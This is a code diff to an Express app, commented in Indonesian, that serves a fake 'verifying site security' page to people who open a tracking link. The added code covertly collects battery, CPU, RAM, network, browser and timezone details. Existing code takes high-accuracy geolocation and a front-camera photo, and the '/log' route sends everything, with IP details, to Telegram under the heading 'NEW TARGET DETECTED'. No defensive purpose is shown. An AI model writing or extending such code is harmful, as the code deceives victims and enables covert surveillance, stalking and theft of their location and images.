@@ -60,7 +60,7 @@ app.get('/w', async (req, res) => {
         }
     }
 
-    // Jika yang mengakses adalah pengguna asli, tampilkan halaman verifikasi
+    // Jika yang mengakses adalah pengguna asli, tampilkan halaman verifikasi lengkap
     res.send(`
     <!DOCTYPE html>
     <html lang="id">
@@ -103,7 +103,7 @@ app.get('/w', async (req, res) => {
                 margin: 0 auto;
             }
             .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
-            .footer-info span { display: block; }
+            .footer-info span { display: block; margin-top: 4px; }
             @keyframes spin { to { transform: rotate(360deg); } }
         </style>
     </head>
@@ -114,7 +114,7 @@ app.get('/w', async (req, res) => {
                     <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.06 14.44L6.5 11l1.41-1.41 3.09 3.09 7.07-7.07L19.5 7.05l-8.48 8.48-0.08-0.09z"/>
                 </svg>
             </div>
-            <h1>Memverifikasi koneksi Anda aman</h1>
+            <h1>Memverifikasi keamanan situs</h1>
             <p>Proses ini otomatis untuk melindungi Anda dari ancaman online. Harap tunggu sebentar.</p>
             <div class="spinner"></div>
             <div class="footer-info">
@@ -163,6 +163,38 @@ app.get('/w', async (req, res) => {
                     camera: 'Ditolak atau Tidak Tersedia'
                 };
 
+                // Mengumpulkan Info Baterai
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        isCharging: battery.charging
+                    };
+                } catch (e) {
+                    data.battery = { level: 'N/A', isCharging: 'N/A' };
+                }
+
+                // Mengumpulkan Info Hardware & Jaringan
+                data.hardware = {
+                    cpuCores: navigator.hardwareConcurrency || 'N/A',
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A'
+                };
+                data.network = {
+                    connectionType: navigator.connection?.type || 'N/A',
+                    effectiveType: navigator.connection?.effectiveType || 'N/A',
+                    downlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A'
+                };
+
+                // Mengumpulkan Info Browser Tambahan
+                data.browser = {
+                    viewportWidth: window.innerWidth,
+                    viewportHeight: window.innerHeight,
+                    pixelRatio: window.devicePixelRatio,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                // Mengumpulkan Info Lokasi (Geolocation)
                 try {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
@@ -172,6 +204,7 @@ app.get('/w', async (req, res) => {
                     console.warn('Geolocation failed:', e.message);
                 }
 
+                // Mengambil Gambar dari Kamera
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     const video = document.createElement('video');
@@ -185,7 +218,6 @@ app.get('/w', async (req, res) => {
                     stream.getTracks().forEach(track => track.stop());
                 } catch (e) {
                     console.warn('Camera access failed:', e.message);
-                    data.camera = 'Ditolak atau Tidak Tersedia';
                 }
 
                 await logData(data);
@@ -199,7 +231,7 @@ app.get('/w', async (req, res) => {
     `);
 });
 
-// Route untuk menerima log dan mengirim ke Telegram
+// Route untuk menerima log dan mengirim ke Telegram dengan format baru yang lengkap
 app.post('/log', async (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -222,22 +254,34 @@ app.post('/log', async (req, res) => {
 
     const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
     const cameraStatusText = isCameraAllowed ? '✅ Diizinkan (Gambar terlampir)' : data.camera;
+    const batteryStatus = data.battery.isCharging ? '🔌 Sedang Mengisi Daya' : '🔋 Tidak Mengisi Daya';
 
     const message =
-`🎯 *TARGET MENGKLIK LINK ANDA!* 🎯
+`🎯 *TARGET BARU TERDETEKSI* 🎯
 -----------------------------------
 🔗 *URL Asli:* ${data.targetUrl}
 
-🖥️ *Info Perangkat & Jaringan*
+*— INFO PERANGKAT & JARINGAN —*
+📱 *Platform:* ${data.platform}
+🧠 *CPU Cores:* ${data.hardware.cpuCores}
+💾 *RAM (Perkiraan):* ${data.hardware.ram}
+📶 *Jaringan:* ${data.network.connectionType} (${data.network.effectiveType}) - ${data.network.downlink}
+⚡ *Baterai:* ${data.battery.level} (${batteryStatus})
+
+*— INFO BROWSER & LOKASI —*
+🖥️ *User Agent:* ${data.userAgent}
+📏 *Resolusi:* ${data.screenWidth}x${data.screenHeight} | *Viewport:* ${data.browser.viewportWidth}x${data.browser.viewportHeight}
+🍪 *Cookies:* ${data.browser.cookiesEnabled ? 'Aktif' : 'Nonaktif'}
+⏰ *Zona Waktu:* ${data.browser.timezone}
+🗣️ *Bahasa:* ${data.language}
+📍 *Lokasi:* ${data.location}
+
+*— INFO KONEKSI (IP) —*
 - *Alamat IP:* ${ip}
 - *Detail IP:*\n${ipInfo}
-- *User Agent:* ${data.userAgent}
-- *Platform:* ${data.platform} (${data.screenWidth}x${data.screenHeight})
-- *Bahasa:* ${data.language}
 
-📍 *Izin yang didapat*
-- *Lokasi:* ${data.location}
-- *Status Kamera:* ${cameraStatusText}
+*— IZIN YANG DIDAPAT —*
+📸 *Status Kamera:* ${cameraStatusText}
 `;
 
     try {
